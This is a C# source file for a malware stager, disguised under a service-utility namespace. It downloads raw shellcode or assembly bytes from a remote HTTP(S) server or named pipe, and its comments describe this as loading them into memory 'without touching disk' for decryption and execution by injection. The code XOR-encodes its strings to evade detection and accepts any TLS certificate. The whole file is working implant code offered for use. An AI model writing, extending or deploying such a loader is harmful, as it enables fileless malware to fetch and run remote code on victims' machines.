using System;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Text;

namespace SvcUtil
{
    /// <summary>
    /// Payload staging — fetch raw shellcode or assembly bytes from
    /// a remote source without touching disk.
    ///
    /// Supported transports:
    ///   - HTTP / HTTPS (WebClient download)
    ///   - Named pipe (client connects to a pipe server)
    ///
    /// Both return raw bytes, ready for AES decryption and execution
    /// via PayloadRunner or injection. No base64 encoding needed.
    /// </summary>
    internal static class Stager
    {
        // ── String encoding ────────────────────────────────────────

        private static readonly byte[] _xk = { 0xA2, 0x73, 0xDE, 0x41, 0xB9 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Encoded: "Mozilla/5.0"
        private static readonly byte[] _sUserAgent =
            { 0xEF, 0x1C, 0xA4, 0x28, 0xD5, 0xCE, 0x12, 0xF1,
              0x74, 0x97, 0x92 };

        // ── HTTP(S) Staging ────────────────────────────────────────

        /// <summary>
        /// Download raw payload bytes from an HTTP or HTTPS URL.
        /// Accepts self-signed certificates for HTTPS.
        /// </summary>
        /// <param name="url">Full URL to download from.</param>
        /// <returns>Payload bytes, or null on failure.</returns>
        public static byte[] FromHttp(string url)
        {
            try
            {
                // Accept any server certificate (self-signed staging)
                ServicePointManager.ServerCertificateValidationCallback =
                    (sender, cert, chain, errors) => true;

                // Force TLS 1.2 minimum
                ServicePointManager.SecurityProtocol =
                    (SecurityProtocolType)3072;

                using (var wc = new WebClient())
                {
                    wc.Headers.Add("User-Agent", D(_sUserAgent));
                    return wc.DownloadData(url);
                }
            }
            catch
            {
                return null;
            }
        }

        // ── Named Pipe Staging ─────────────────────────────────────

        /// <summary>
        /// Read raw payload bytes from a named pipe.
        /// Connects as a client to a local or remote pipe server.
        /// </summary>
        /// <param name="pipeName">
        /// Pipe name. For local pipes, just the name (e.g., "mypipe").
        /// For remote: "server/pipe/name" format.
        /// </param>
        /// <param name="timeoutMs">Connection timeout in ms.</param>
        /// <returns>Payload bytes, or null on failure.</returns>
        public static byte[] FromPipe(string pipeName,
            int timeoutMs = 30000)
        {
            try
            {
                string server = ".";
                string pipe = pipeName;

                // Parse "server/pipename" format
                int sep = pipeName.IndexOf('/');
                if (sep > 0)
                {
                    server = pipeName.Substring(0, sep);
                    pipe = pipeName.Substring(sep + 1);
                }

                using (var client = new NamedPipeClientStream(
                    server, pipe, PipeDirection.In))
                {
                    client.Connect(timeoutMs);

                    using (var ms = new MemoryStream())
                    {
                        byte[] buf = new byte[8192];
                        int read;
                        while ((read = client.Read(
                            buf, 0, buf.Length)) > 0)
                        {
                            ms.Write(buf, 0, read);
                        }
                        return ms.ToArray();
                    }
                }
            }
            catch
            {
                return null;
            }
        }
    }
}
